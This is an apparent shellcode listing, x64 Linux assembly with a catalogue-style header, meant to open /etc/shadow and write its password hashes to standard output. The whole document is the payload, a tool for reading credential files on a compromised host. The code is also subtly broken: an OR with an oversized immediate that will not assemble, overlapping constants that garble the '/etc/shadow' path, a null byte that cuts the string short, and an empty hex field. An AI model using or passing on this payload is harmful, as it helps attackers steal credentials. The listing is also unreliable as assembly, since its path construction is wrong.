; Title:    Linux x64 read /etc/shadow to stdout
; Platform: linux
; Arch:     x64
; Size:     ~60 bytes
; Encoding: raw
;
; Hex:
; ; hand-crafted

BITS 64
global _start

_start:
    ; open("/etc/shadow", O_RDONLY)
    xor     rax, rax
    push    rax
    mov     rbx, 0x776f6461
    shl     rbx, 32
    or      rbx, 0x68732f6374
    push    rbx
    mov     rbx, 0x652f2f2f2f2f2f
    push    rbx
    mov     rdi, rsp
    xor     rsi, rsi
    xor     rdx, rdx
    push    0x2
    pop     rax
    syscall
    push    rax
    pop     rdi
    ; read(fd, buf, 4096)
    sub     rsp, 0x1000
    mov     rsi, rsp
    push    0x1000
    pop     rdx
    xor     rax, rax
    syscall
    push    rax
    pop     rdx
    ; write(1, buf, n)
    push    1
    pop     rdi
    push    0x1
    pop     rax
    syscall
    ; exit(0)
    xor     edi, edi
    push    0x3c
    pop     rax
    syscall
